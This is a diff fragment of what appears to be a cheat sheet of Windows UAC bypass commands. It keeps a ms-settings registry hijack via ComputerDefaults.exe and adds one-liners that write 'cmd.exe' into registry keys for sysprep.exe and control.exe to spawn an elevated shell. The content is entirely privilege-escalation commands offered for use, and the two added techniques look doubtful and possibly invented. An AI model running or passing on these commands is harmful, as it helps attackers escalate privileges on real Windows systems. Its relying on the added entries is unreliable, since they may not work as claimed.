@@ -58,3 +58,18 @@ Using ComputerDefaults.exe: <br><br>
 reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && start computerdefaults.exe
 ```
 
+Using sysprep.exe:
+
+```
+
+reg add HKCU\Software\Classes\AppID\{921C1A8B-9F15-4DA4-9235-0472C3A216E6} /f /ve /t REG_SZ /d "cmd.exe" && start C:\Windows\System32\sysprep\sysprep.exe
+```
+
+Using control.exe with /computername:
+
+```
+
+cmd /c reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /ve /d "cmd.exe" /f && control.exe /computername
+
+```
+
